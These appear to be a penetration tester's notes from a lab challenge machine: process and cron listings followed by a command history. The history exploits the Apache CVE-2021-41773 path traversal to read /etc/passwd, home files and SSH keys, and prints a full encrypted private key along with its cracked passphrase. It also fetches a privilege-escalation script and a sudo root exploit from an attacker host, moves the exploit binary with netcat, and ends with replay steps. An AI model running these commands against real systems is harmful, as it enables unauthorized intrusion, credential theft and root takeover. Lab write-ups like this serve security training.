root         571  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop4]
root         572  0.0  0.0      0     0 ?        S<   15:45   0:00 [loop5]
systemd+     585  0.0  0.3  90876  6172 ?        Ssl  15:45   0:00 /lib/systemd/systemd-timesyncd
root         599  0.0  0.5  47540 10452 ?        Ss   15:45   0:00 /usr/bin/VGAuthService
root         600  0.0  0.4 311540  8568 ?        Ssl  15:45   0:02 /usr/bin/vmtoolsd
systemd+     674  0.0  0.3  19164  7892 ?        Ss   15:45   0:00 /lib/systemd/systemd-networkd
systemd+     676  0.0  0.5  24536 12136 ?        Ss   15:45   0:00 /lib/systemd/systemd-resolved
root         687  0.0  0.3 235564  7400 ?        Ssl  15:45   0:00 /usr/lib/accountsservice/accounts-daemon
root         691  0.0  0.1   6816  2836 ?        Ss   15:45   0:00 /usr/sbin/cron -f
message+     692  0.0  0.2   7580  4532 ?        Ss   15:45   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --system
root         699  0.0  0.9  29672 18592 ?        Ss   15:45   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         700  0.0  0.3 232716  6820 ?        Ssl  15:45   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       701  0.0  0.2 224344  4772 ?        Ssl  15:45   0:00 /usr/sbin/rsyslogd -n -iNONE
root         703  0.0  2.0 727400 41912 ?        Ssl  15:45   0:05 /usr/lib/snapd/snapd
root         706  0.0  0.3  17336  7708 ?        Ss   15:45   0:00 /lib/systemd/systemd-logind
root         708  0.0  0.5 393176 11992 ?        Ssl  15:45   0:00 /usr/lib/udisks2/udisksd
daemon       712  0.0  0.1   3796  2216 ?        Ss   15:45   0:00 /usr/sbin/atd -f
root         713  0.0  0.1   6808  3132 ?        Ss   15:45   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root         732  0.0  0.0   5828  1840 tty1     Ss+  15:45   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         753  0.0  0.3  12176  7476 ?        Ss   15:45   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         758  0.0  0.5 241368 11036 ?        Ssl  15:45   0:00 /usr/sbin/ModemManager
root         788  0.0  0.3  17484  7276 ?        Ss   15:45   0:00 /opt/apache2/bin/httpd -k start
apache       796  0.0  0.7 769828 15724 ?        Sl   15:45   0:00 /opt/apache2/bin/httpd -k start
apache       797  0.0  0.8 769944 16264 ?        Sl   15:45   0:00 /opt/apache2/bin/httpd -k start
apache       798  0.0  0.7 769828 15152 ?        Sl   15:45   0:00 /opt/apache2/bin/httpd -k start
apache      2566  0.0  0.8 769976 17240 ?        Sl   16:13   0:00 /opt/apache2/bin/httpd -k start
root        3798  0.0  0.0      0     0 ?        I    16:58   0:00 [kworker/0:2-events]
root        4853  0.0  0.4  13796  9104 ?        Ss   17:40   0:00 sshd: anita [priv]
anita       4870  0.0  0.4  19076  9496 ?        Ss   17:40   0:00 /lib/systemd/systemd --user
anita       4874  0.0  0.2 104956  4472 ?        S    17:40   0:00 (sd-pam)
root        4875  0.0  0.0      0     0 ?        I    17:40   0:00 [kworker/0:0-events]
anita       4977  0.0  0.2  13932  5944 ?        S    17:40   0:00 sshd: anita@pts/0
anita       4982  0.0  0.0   2608  1708 pts/0    Ss   17:40   0:00 -sh
root        5022  0.0  0.0      0     0 ?        I    17:41   0:00 [kworker/u2:2-events_power_efficient]
root        5166  0.0  0.0      0     0 ?        I    17:46   0:00 [kworker/u2:1-events_unbound]
root        5313  0.0  0.0      0     0 ?        I    17:52   0:00 [kworker/u2:0-events_unbound]
anita       5386  0.0  0.1   8888  3288 pts/0    R+   17:55   0:00 ps aux

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```
`ls -lah /etc/cron*`
```
-rw-r--r-- 1 root root 1.1K Feb 13  2020 /etc/crontab

/etc/cron.d:
total 20K
drwxr-xr-x  2 root root 4.0K Oct 12  2022 .
drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 48K
drwxr-xr-x  2 root root 4.0K Oct 12  2022 .
drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1.5K Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1.2K Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1.1K Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4.5K Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12K
drwxr-xr-x  2 root root 4.0K Apr 23  2020 .
drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12K
drwxr-xr-x  2 root root 4.0K Apr 23  2020 .
drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20K
drwxr-xr-x  2 root root 4.0K Oct 12  2022 .
drwxr-xr-x 98 root root 4.0K Oct 28  2022 ..
-rwxr-xr-x  1 root root  813 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  403 Apr 25  2022 update-notifier-common
```

# Command History
```c
    sudo nmap -sV -p 443 --script "http-vuln-cve-2021-41773.nse" 192.168.152.245
    // found to be vulnerable to path traversal
    curl -k https://192.168.152.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    // offsec
    // miranda
    // steven
    // mark
    // anita
    // try to get id_rsa tokens
    curl -k https://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/offsec/.ssh/id_rsa
    while read user; do curl -k https://192.168.152.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/$user/.ssh/id_rsa; done < ~/offsec/challenge/2/users.txt
    // 404 not founds on all users
    // also forbidden access to /root
    
    curl -k https://192.168.240.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.bash_history
    // anita and offsec forbidden others not found
    for user in offsec miranda steven mark anita; do
        for file in .bashrc .profile .sh_history .viminfo .mysql_history; do
            echo "[*] $user:$file"
            curl -k -s https://192.168.152.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/$user/$file
        done
    done
    // seems like nothing there, user_file_search.txt
    curl -k https://192.168.240.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/apache2/access.log
    curl -k https://192.168.240.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/log/apache2/error.log
    curl -k https://192.168.240.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/config.php
    curl -k https://192.168.240.245:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/wp-config.php
    // used cve41773_enum.sh results in loot folder
    // Found local.txt under anita
    curl -sk https://192.168.240.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/vsftpd.conf 
    // found ftp is configured for anonymous user login
    // ...
    // # Allow anonymous FTP? (Disabled by default).
    // anonymous_enable=YES
    // #
    // # Uncomment this to allow local users to log in.
    // local_enable=YES
    // ...
    ftp 192.168.240.245
    //lftp -e "set ssl:verify-certificate no; open ftp://anonymous:@192.168.240.245; mirror --verbose / ./downloaded; bye"

    // discovered that ssh did not accept password based logins
    curl http://192.168.240.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/authorized_keys
    // ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThMfArBngFjl7RJYCOTqY5Mmid0sNJwA= anita@relia
    curl http://192.168.240.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa
    // -----BEGIN OPENSSH PRIVATE KEY-----
    // b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
    // 13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
    // dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
    // fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
    // ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
    // 8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
    // CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
    // -----END OPENSSH PRIVATE KEY-----
    chmod 600 challenge/2/192.168.X/245/anita_key 
    ssh2john challenge/2/192.168.X/245/anita_key > anita_hash.txt
    john anita_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    // fireball
    ssh-keygen -p -f anita_key
    // entered fireball as password set to no password
    ssh -i challenge/2/192.168.X/245/anita_key_no_pass anita@192.168.240.245 -p 2222
    // success
    curl 192.168.45.214/unix-privesc-check > unix-privesc-check
    // put file on target
    ./unix-privesc-check standard > out.txt
    // WARNING: /home/anita/.ssh/authorized_keys is in the home directory of anita. The group apache can read /home/anita/.ssh/authorized_keys
    // WARNING: /opt/apache2/bin/httpd is currently running as root. The user apache can write to /opt/apache2/bin/httpd
    // WARNING: /opt/apache2/bin/httpd is currently running as root. The user apache can write to /opt/apache2/bin
    // WARNING: /opt/apache2/bin/httpd is currently running as root. The user apache can write to /opt/apache2

    // root got with
    git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
    // curl *.c and Makefile to target
    //run make on target
    ./exploit

    // retrieve the compiled binary for future use
    //kali
    nc -lvp 9001 > challenge/2/192.168.X/245/exploit
    //this box
    nc 192.168.45.214 9001 < exploit


```
# Exploit Steps
- ssh -i challenge/2/192.168.X/245/anita_key_no_pass anita@192.168.240.245 -p 2222
- curl 192.168.45.214/challenge/2/192.168.X/245/exploit --output exploit
- ./exploit
- Should now be root